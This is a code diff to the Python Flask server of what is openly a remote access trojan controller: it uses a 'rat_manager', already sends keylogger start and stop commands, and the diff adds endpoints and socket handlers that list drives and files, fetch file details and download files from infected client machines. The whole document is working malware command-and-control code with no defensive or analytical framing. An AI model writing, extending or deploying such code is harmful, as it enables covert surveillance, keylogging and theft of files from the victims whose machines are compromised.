@@ -195,6 +195,34 @@ class ClientHandler(threading.Thread):
                 'payload': payload
             })
             
+        elif msg_type == ResponseTypes.FILE_LIST:
+            payload = parsed.get('payload', {})
+            socketio.emit('file_list', {
+                'client_id': self.client_id,
+                'payload': payload
+            })
+            
+        elif msg_type == ResponseTypes.FILE_DOWNLOAD:
+            payload = parsed.get('payload', {})
+            socketio.emit('file_download', {
+                'client_id': self.client_id,
+                'payload': payload
+            })
+            
+        elif msg_type == ResponseTypes.FILE_INFO:
+            payload = parsed.get('payload', {})
+            socketio.emit('file_info', {
+                'client_id': self.client_id,
+                'payload': payload
+            })
+            
+        elif msg_type == ResponseTypes.DRIVES_LIST:
+            payload = parsed.get('payload', {})
+            socketio.emit('drives_list', {
+                'client_id': self.client_id,
+                'payload': payload
+            })
+            
         elif msg_type == ResponseTypes.ERROR:
             socketio.emit('client_error', {
                 'client_id': self.client_id,
@@ -322,6 +350,59 @@ def send_keylog_stop_command():
     
     if rat_manager.send_command_to_client(client_id, Commands.KEYLOG_STOP):
         return jsonify({'status': 'success', 'message': 'Keylogger stop command sent'})
+    else:
+        return jsonify({'status': 'error', 'message': 'Failed to send command'})
+
+@app.route('/api/command/file_list', methods=['POST'])
+def send_file_list_command():
+    """Send file list command to client"""
+    data = request.json
+    client_id = data.get('client_id')
+    path = data.get('path')
+    
+    if rat_manager.send_command_to_client(client_id, Commands.FILE_LIST, path=path):
+        return jsonify({'status': 'success', 'message': 'File list command sent'})
+    else:
+        return jsonify({'status': 'error', 'message': 'Failed to send command'})
+
+@app.route('/api/command/file_download', methods=['POST'])
+def send_file_download_command():
+    """Send file download command to client"""
+    data = request.json
+    client_id = data.get('client_id')
+    file_path = data.get('file_path')
+    
+    if not file_path:
+        return jsonify({'status': 'error', 'message': 'Missing file_path parameter'})
+    
+    if rat_manager.send_command_to_client(client_id, Commands.FILE_DOWNLOAD, file_path=file_path):
+        return jsonify({'status': 'success', 'message': 'File download command sent'})
+    else:
+        return jsonify({'status': 'error', 'message': 'Failed to send command'})
+
+@app.route('/api/command/file_info', methods=['POST'])
+def send_file_info_command():
+    """Send file info command to client"""
+    data = request.json
+    client_id = data.get('client_id')
+    file_path = data.get('file_path')
+    
+    if not file_path:
+        return jsonify({'status': 'error', 'message': 'Missing file_path parameter'})
+    
+    if rat_manager.send_command_to_client(client_id, Commands.FILE_INFO, file_path=file_path):
+        return jsonify({'status': 'success', 'message': 'File info command sent'})
+    else:
+        return jsonify({'status': 'error', 'message': 'Failed to send command'})
+
+@app.route('/api/command/get_drives', methods=['POST'])
+def send_get_drives_command():
+    """Send get drives command to client"""
+    data = request.json
+    client_id = data.get('client_id')
+    
+    if rat_manager.send_command_to_client(client_id, Commands.GET_DRIVES):
+        return jsonify({'status': 'success', 'message': 'Get drives command sent'})
     else:
         return jsonify({'status': 'error', 'message': 'Failed to send command'})
 
